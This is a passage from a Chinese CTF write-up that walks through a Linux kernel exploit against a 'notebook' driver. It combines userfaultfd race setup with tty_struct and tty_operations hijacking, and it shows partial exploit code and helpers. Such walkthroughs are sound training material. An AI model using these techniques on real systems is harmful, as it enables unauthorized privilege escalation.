class="number">0</span>;</span><br><span class="line">	ptm_driver-&gt;init_termios.c_oflag = <span class="number">0</span>;</span><br><span class="line">	ptm_driver-&gt;init_termios.c_cflag = B38400 | CS8 | CREAD;</span><br><span class="line">	ptm_driver-&gt;init_termios.c_lflag = <span class="number">0</span>;</span><br><span class="line">	ptm_driver-&gt;init_termios.c_ispeed = <span class="number">38400</span>;</span><br><span class="line">	ptm_driver-&gt;init_termios.c_ospeed = <span class="number">38400</span>;</span><br><span class="line">	ptm_driver-&gt;other = pts_driver;</span><br><span class="line">	tty_set_operations(ptm_driver, &amp;ptm_unix98_ops);</span><br><span class="line"></span><br><span class="line">	pts_driver-&gt;driver_name = <span class="string">&quot;pty_slave&quot;</span>;</span><br><span class="line">	pts_driver-&gt;name = <span class="string">&quot;pts&quot;</span>;</span><br><span class="line">	pts_driver-&gt;major = UNIX98_PTY_SLAVE_MAJOR;</span><br><span class="line">	pts_driver-&gt;minor_start = <span class="number">0</span>;</span><br><span class="line">	pts_driver-&gt;type = TTY_DRIVER_TYPE_PTY;</span><br><span class="line">	pts_driver-&gt;subtype = PTY_TYPE_SLAVE;</span><br><span class="line">	pts_driver-&gt;init_termios = tty_std_termios;</span><br><span class="line">	pts_driver-&gt;init_termios.c_cflag = B38400 | CS8 | CREAD;</span><br><span class="line">	pts_driver-&gt;init_termios.c_ispeed = <span class="number">38400</span>;</span><br><span class="line">	pts_driver-&gt;init_termios.c_ospeed = <span class="number">38400</span>;</span><br><span class="line">	pts_driver-&gt;other = ptm_driver;</span><br><span class="line">	tty_set_operations(pts_driver, &amp;pty_unix98_ops);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tty_register_driver(ptm_driver))</span><br><span class="line">		panic(<span class="string">&quot;Couldn&#x27;t register Unix98 ptm driver&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (tty_register_driver(pts_driver))</span><br><span class="line">		panic(<span class="string">&quot;Couldn&#x27;t register Unix98 pts driver&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now create the /dev/ptmx special device */</span></span><br><span class="line">	tty_default_fops(&amp;ptmx_fops);</span><br><span class="line">	ptmx_fops.open = ptmx_open;</span><br><span class="line"></span><br><span class="line">	cdev_init(&amp;ptmx_cdev, &amp;ptmx_fops);</span><br><span class="line">	<span class="keyword">if</span> (cdev_add(&amp;ptmx_cdev, MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="number">1</span>) ||</span><br><span class="line">	    register_chrdev_region(MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="number">1</span>, <span class="string">&quot;/dev/ptmx&quot;</span>) &lt; <span class="number">0</span>)</span><br><span class="line">		panic(<span class="string">&quot;Couldn&#x27;t register /dev/ptmx driver&quot;</span>);</span><br><span class="line">	device_create(tty_class, <span class="literal">NULL</span>, MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="literal">NULL</span>, <span class="string">&quot;ptmx&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到其中一共通过tty_alloc_driver函数分配了两个tty_operations结构体，这两个结构体的tty_operations被分别赋值为ptm_unix98_ops和pty_unix98_ops。这两个是静态常量，因此可以在vmlinux的符号表中找到，其地址与基址的差值固定：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">ptm_unix98_ops</span> =</span> &#123;</span><br><span class="line">	.lookup = ptm_unix98_lookup,</span><br><span class="line">	.install = pty_unix98_install,</span><br><span class="line">	.remove = pty_unix98_remove,</span><br><span class="line">	.open = pty_open,</span><br><span class="line">	.close = pty_close,</span><br><span class="line">	.write = pty_write,</span><br><span class="line">	.write_room = pty_write_room,</span><br><span class="line">	.flush_buffer = pty_flush_buffer,</span><br><span class="line">	.chars_in_buffer = pty_chars_in_buffer,</span><br><span class="line">	.unthrottle = pty_unthrottle,</span><br><span class="line">	.ioctl = pty_unix98_ioctl,</span><br><span class="line">	.compat_ioctl = pty_unix98_compat_ioctl,</span><br><span class="line">	.resize = pty_resize,</span><br><span class="line">	.cleanup = pty_cleanup,</span><br><span class="line">	.show_fdinfo = pty_show_fdinfo,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">pty_unix98_ops</span> =</span> &#123;</span><br><span class="line">	.lookup = pts_unix98_lookup,</span><br><span class="line">	.install = pty_unix98_install,</span><br><span class="line">	.remove = pty_unix98_remove,</span><br><span class="line">	.open = pty_open,</span><br><span class="line">	.close = pty_close,</span><br><span class="line">	.write = pty_write,</span><br><span class="line">	.write_room = pty_write_room,</span><br><span class="line">	.flush_buffer = pty_flush_buffer,</span><br><span class="line">	.chars_in_buffer = pty_chars_in_buffer,</span><br><span class="line">	.unthrottle = pty_unthrottle,</span><br><span class="line">	.set_termios = pty_set_termios,</span><br><span class="line">	.start = pty_start,</span><br><span class="line">	.stop = pty_stop,</span><br><span class="line">	.cleanup = pty_cleanup,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在一个线程被阻塞时，我们可以通过read函数读取到tty_operations的地址值，通过最后12比特来确认这里的值是pty_unix98_ops还是ptm_unix98_ops。</p>
<p><strong>注意：tty_alloc_driver函数实际上调用的是__tty_alloc_driver这个函数，其中将tty_struct的magic字段赋值为TTY_DRIVER_MAGIC，值为0x5402（4.15.8版本内核，不同版本的值可能不同）。因此可以通过读取magic值判断这块内存是否被分配为tty_struct结构体。</strong></p>
<p>我们将tty_operations改为我们构造好的结构，但本题开启了SMP保护，不能直接写一个用户空间的内存地址。考虑到notegift函数能够为我们返回所有note的地址，因此可以考虑将tty_operations写在note里面。</p>
<h1 id="step-11-exp编写写好交互"><a class="markdownIt-Anchor" href="#step-11-exp编写写好交互"></a> Step 11 exp编写——写好交互</h1>
<p>实现接口与提示性输出。<br />
uffdexploit.c:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-28.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ROOTFS_UFFDEXPLOIT_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROOTFS_UFFDEXPLOIT_H</span></span><br><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m[x] Error: %s\n\033[m&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为一块指定地址addr、大小len的内存空间注册缺页异常函数handler</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">registerUserFaultFd</span><span class="params">(<span class="type">void</span> * addr, <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">void</span>* (*handler)(<span class="type">void</span>*))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>)uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>)uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//ROOTFS_UFFDEXPLOIT_H</span></span></span><br></pre></td></tr></table></figure>
<p>exp.c（不完整）:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-28.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;uffdexploit.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_CODE 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GIFT_CODE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELETE_CODE 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_CODE 768</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">notearg</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">void</span>* buf;</span><br><span class="line">&#125;notearg;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteadd</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notegift</span><span class="params">(<span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notedel</span><span class="params">(<span class="type">size_t</span> idx)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notewrite</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> idx)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notebook_msg</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteadd</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mAdd note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    notearg arg = &#123;idx, size, buf&#125;;</span><br><span class="line">    <span class="keyword">if</span>(size &lt;= <span class="number">0x60</span>)</span><br><span class="line">        ioctl(fd, ADD_CODE, &amp;arg);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mAdding note which has size larger than 0x60, use edit...\n\033[m&quot;</span>);</span><br><span class="line">        arg.size = <span class="number">0x60</span>;</span><br><span class="line">        ioctl(fd, ADD_CODE, &amp;arg);</span><br><span class="line">        arg.size = size;</span><br><span class="line">        noteedit(idx, size, buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notegift</span><span class="params">(<span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mFetch note information...\n\033[m&quot;</span>);</span><br><span class="line">    notearg arg = &#123;<span class="number">0</span>, <span class="number">0</span>, buf&#125;;</span><br><span class="line">    ioctl(fd, GIFT_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notedel</span><span class="params">(<span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mDelete note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    notearg arg = &#123;idx, <span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    ioctl(fd, DELETE_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mResize note #%zu to %zu...\n\033[m&quot;</span>, idx, size);</span><br><span class="line">    notearg arg = &#123;idx, size, buf&#125;;</span><br><span class="line">    ioctl(fd, EDIT_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notewrite</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mWrite to note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    write(fd, buf, idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notebook_msg</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> noteBuf[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    notegift(noteBuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;36m--------------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Current Notebook Info:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\tNote #%2d: size = %zu, pointer = %p\n&quot;</span>, i, noteBuf[i*<span class="number">2</span>+<span class="number">1</span>], (<span class="type">char</span>*)noteBuf[i*<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------------\n\033[m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="step-12-exp编写使userfaultfd成功阻塞主线程"><a class="markdownIt-Anchor" href="#step-12-exp编写使userfaultfd成功阻塞主线程"></a> Step 12: exp编写——使userfaultfd成功阻塞主线程</h1>
<p>编译测试的时候别忘了加上-lpthread选项。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    page = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* mmap_space = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span 